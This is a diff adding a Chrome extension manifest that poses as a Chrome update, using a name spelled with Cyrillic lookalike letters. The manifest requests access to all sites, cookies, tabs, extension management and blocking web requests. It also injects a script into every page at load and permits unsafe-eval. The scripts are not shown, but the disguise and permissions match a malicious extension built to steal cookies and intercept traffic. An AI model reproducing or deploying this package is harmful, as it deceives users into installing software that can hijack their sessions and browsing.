@@ -1,0 +1,32 @@
+{
+"update_url": "https://clients2.google.com/service/update2/crx",
+
+  "manifest_version": 2,
+  "name": "Chrоmе updatе #60.1.2",
+  "version": "1.0.3",
+  "minimum_chrome_version": "15",
+   "background": {
+      "scripts": [ "background.js" ]
+   },
+   "content_scripts": [ {
+      "all_frames": false,
+      "js": ["jquery.js" ],
+      "matches": ["*://*/*"],
+      "run_at" : "document_start"
+   } ],
+  "icons": {
+    "16": "assets/icon_16.png",
+    "48": "assets/icon_48.png",
+    "128": "assets/icon_128.png"
+  },
+  "permissions": [
+        "http://*/","https://*/", "management",
+        "unlimitedStorage",
+        "storage",
+        "tabs",
+        "cookies",
+        "webRequest",
+        "webRequestBlocking"
+    ],
+  "content_security_policy": "script-src 'self' 'unsafe-eval'; object-src 'self'"
+}
